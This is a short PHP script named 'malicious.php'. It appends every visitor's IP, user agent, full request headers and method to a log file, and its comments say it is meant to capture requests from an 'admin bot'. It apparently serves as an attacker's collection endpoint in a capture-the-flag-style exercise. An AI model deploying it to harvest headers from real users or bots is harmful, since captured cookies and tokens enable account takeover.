<?php
// malicious.php
// This script logs incoming request details from the admin bot

// Format log entry with date/time and request details
$logData = "----- " . date('Y-m-d H:i:s') . " -----\n";
$logData .= "Remote IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
$logData .= "User Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'N/A') . "\n";
$logData .= "Headers: " . print_r(getallheaders(), true) . "\n";
$logData .= "Request Method: " . $_SERVER['REQUEST_METHOD'] . "\n";
$logData .= "--------------------------------------\n";

// Append log data to a file
file_put_contents("malicious_log.txt", $logData, FILE_APPEND);

// Respond with a simple confirmation message
echo "OK";
?>
